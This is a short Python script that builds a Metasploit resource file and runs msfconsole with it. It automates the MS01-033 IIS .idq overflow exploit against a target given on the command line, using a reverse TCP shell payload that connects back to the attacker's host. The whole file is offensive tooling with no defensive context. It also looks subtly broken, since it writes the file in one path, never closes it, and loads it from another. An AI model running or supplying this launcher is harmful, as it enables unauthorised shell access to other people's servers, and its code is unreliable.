import sys
import os

def msf(config):
    config=open('zkpy.rc','w')
    config.write('use exploit/windows/iis/ms01_033_idq'+"\n")
    config.write('set PAYLOAD windows/shell/reverse_tcp'+"\n")
    config.write('set RHOST '+sys.argv[1]+"\n")
    config.write('set LHOST '+sys.argv[2]+"\n")
    config.write('set TARGET '+sys.argv[3]+"\n")
    config.write('exploit'+"\n")

msf('')
def main():
    mg=os.system('msfconsole -r /root/zkpy.rc')

if __name__ == '__main__':
    main()